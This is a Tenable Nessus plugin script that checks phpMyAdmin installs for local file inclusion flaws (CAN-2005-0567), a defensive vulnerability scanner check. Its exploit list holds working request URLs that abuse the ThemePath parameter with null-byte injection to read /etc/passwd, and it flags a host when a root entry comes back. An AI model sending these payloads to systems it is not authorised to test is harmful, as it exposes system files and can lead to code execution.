#
# (C) Tenable Network Security
#

if(description) {
  script_id(17221);
  script_version("$Revision: 1.3 $");

  script_cve_id("CAN-2005-0567");
  script_bugtraq_id(12645);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"14094");
  }

  name["english"] = "Multiple Local File Include Vulnerabilities in phpMyAdmin";
  script_name(english:name["english"]);
 
  desc["english"] = "
The installed version of phpMyAdmin suffers from multiple local file
include vulnerabilities due to its failure to sanitize user input
prior to its use in PHP include() and require_once() calls. 
Specifically, a remote attacker can control values for the
'GLOBALS[cfg][ThemePath]' parameter used in 'css/phpmyadmin.css.php'
as well as the 'cfg[Server][extension]' parameter use in
'libraries/database_interface.lib.php', which enables him to read
arbitrary files on the remote host and possibly even run arbitrary
code, subject to the privileges of the Web server process. 

Solution : Upgrade to phpMyAdmin 2.6.1 pl1 or later.
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Detect multiple local file include vulnerabilities in phpMyAdmin";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  family["english"] = "Remote file access";
  script_family(english:family["english"]);

  script_dependencie("find_service.nes", "http_version.nasl", "phpMyAdmin_detect.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);

# Try to grab /etc/passwd.
exploits = make_list(
  "/css/phpmyadmin.css.php?GLOBALS[cfg][ThemePath]=/etc/passwd%00&theme=passwd%00",
  "/css/phpmyadmin.css.php?GLOBALS[cfg][ThemePath]=/etc&theme=passwd%00"
  # nb: skip this since it's a bit harder to grab /etc/passwd
  # "/libraries/database_interface.lib.php?cfg[Server][extension]=/etc/passwd"
);


# Check each installed instance, stopping if we find a vulnerability.
installs = get_kb_list(string("www/", port, "/phpMyAdmin"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];

    # Try to grab /etc/passwd.
    foreach exploit (exploits) {
      req = http_get(item:string(dir, exploit), port:port);
      res = http_keepalive_send_recv(port:port, data:req);
      if ( res == NULL ) exit(0);

      # It's a problem if there's an entry for root.
      if ( egrep(string:res, pattern:"root:.+:0:") ) {
        security_hole(port);
        exit(0);
      }
    }
  }
}
